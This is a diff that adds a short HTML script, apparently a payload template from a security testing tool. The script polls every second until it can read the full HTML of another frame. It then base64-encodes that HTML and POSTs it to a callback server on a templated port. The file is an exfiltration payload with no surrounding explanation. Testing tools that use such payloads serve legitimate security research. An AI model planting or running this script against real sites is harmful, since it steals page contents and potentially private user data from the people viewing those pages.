@@ -1,0 +1,11 @@
+<script>
+var id = setInterval(()=>{
+    try{
+        data = btoa(parent.frames[1].document.documentElement.innerHTML)
+        fetch("http://"+window.location.hostname+":{callbackServerPort}/callback", {method:"POST", mode:"no-cors", body:JSON.stringify({"data":data})})
+        clearInterval(id)
+    } catch (e){
+        console.log("Still waiting")
+    }
+}, 1000)
+</script>
